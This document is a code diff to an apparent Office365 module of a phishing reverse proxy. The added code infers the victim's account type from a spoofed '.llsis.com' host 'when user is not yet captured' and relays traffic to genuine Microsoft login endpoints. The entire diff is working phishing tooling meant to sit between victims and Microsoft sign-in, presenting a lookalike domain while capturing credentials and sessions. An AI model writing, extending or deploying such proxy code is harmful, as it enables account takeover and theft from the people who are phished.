@@ -677,27 +677,30 @@ class Office365Module(BaseModule):
             query_string = request.query_string.decode('utf-8')
             
             # Determine target domain based on user type and path
+            personal_domains = ['gmail.com', 'outlook.com', 'hotmail.com', 'live.com', 'msn.com', 'yahoo.com']
+
             if hasattr(self, 'user') and self.user:
-                personal_domains = ['gmail.com', 'outlook.com', 'hotmail.com', 'live.com', 'msn.com', 'yahoo.com']
                 is_personal = any(domain in self.user.lower() for domain in personal_domains)
-                
-                if is_personal:
-                    # For personal accounts, route to appropriate Microsoft consumer domain
-                    if 'consumers' in path or 'fido' in path or 'microsoft.com' in path:
-                        target_url = f"https://login.live.com/{path}"
-                    elif 'account' in path:
-                        target_url = f"https://account.live.com/{path}"
-                    else:
-                        target_url = f"https://login.live.com/{path}"
-                else:
-                    # For organizational accounts, use login.microsoftonline.com
-                    if 'account' in path and 'microsoft.com' in path:
-                        target_url = f"https://account.microsoft.com/{path}"
-                    else:
-                        target_url = f"https://login.microsoftonline.com/{path}"
             else:
-                # Default to organizational
-                target_url = f"https://login.microsoftonline.com/{path}"
+                # Infer from spoof host when user is not yet captured
+                spoof_suffix = '.llsis.com'
+                base_host = request.host[:-len(spoof_suffix)] if request.host.endswith(spoof_suffix) else request.host
+                is_personal = base_host.endswith('live.com') or base_host.startswith('login.live.com') or base_host.startswith('account.live.com')
+
+            if is_personal:
+                # For personal accounts, route to consumer domains
+                if 'consumers' in path or 'fido' in path or 'microsoft.com' in path:
+                    target_url = f"https://login.live.com/{path}"
+                elif 'account' in path:
+                    target_url = f"https://account.live.com/{path}"
+                else:
+                    target_url = f"https://login.live.com/{path}"
+            else:
+                # Organisational / default
+                if 'account' in path and 'microsoft.com' in path:
+                    target_url = f"https://account.microsoft.com/{path}"
+                else:
+                    target_url = f"https://login.microsoftonline.com/{path}"
             
             if query_string:
                 target_url += f"?{query_string}"
